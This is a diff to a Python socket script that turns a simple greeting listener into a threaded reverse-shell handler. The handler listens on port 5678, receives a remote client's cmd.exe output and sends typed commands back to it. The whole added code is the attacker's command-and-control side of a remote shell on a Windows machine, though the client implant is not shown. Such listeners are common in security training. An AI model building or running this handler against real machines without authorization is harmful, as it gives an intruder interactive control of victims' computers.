@@ -1,26 +1,52 @@
 import socket
+import threading
+import time
+import os
+from colorama import Fore, Style
 
+# receive cmd.exe output from the client
+def shellreceiver(conn):
+    while True:
+        try:
+            data = conn.recv(1024)
+            if not data:
+                raise ConnectionError
+            print(data.decode(errors="ignore"), end="", flush=True)
+        except:
+            print(Fore.RED + "\n[!] Connection lost. Exiting..." + Style.RESET_ALL)
+            conn.close()
+            os._exit(0)
 
-tcp_soc = socket.socket()
-print("Socket Created: No Issues")
+# send commands to the client
+def shellsender(conn):
+    while True:
+        try:
+            mycmd = input("")
+            conn.send((mycmd + "\n").encode())
+        except:
+            print(Fore.RED + "\n[!] Connection lost. Exiting..." + Style.RESET_ALL)
+            conn.close()
+            os._exit(0)
 
+host = "0.0.0.0"
+port = 5678
 
-port = int(input(f"Please enter the socket you want to listen on: "))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((host, port))
+s.listen(5)
+print(Fore.YELLOW + f"[+] Listening on port {port}" + Style.RESET_ALL)
 
+conn, addr = s.accept()
+print(Fore.GREEN + f"[*] Accepted new connection from: {addr[0]}:{addr[1]}" + Style.RESET_ALL)
 
-tcp_soc.bind(('', port))
-print("Sokcet binded to %s" %(port))
+# start threads
+recv_thread = threading.Thread(target=shellreceiver, args=(conn,), daemon=True)
+recv_thread.start()
 
-tcp_soc.listen(5)
-print("Socket is listening")
+send_thread = threading.Thread(target=shellsender, args=(conn,), daemon=True)
+send_thread.start()
 
-
+# keep main thread alive
 while True:
-    c, addr  = tcp_soc.accept()
-    print('Got connection from ', addr)
-    
-    c.send('Thanking you for connecting' .encode())
-    
-    c.close
-    
-    break
+    time.sleep(1)
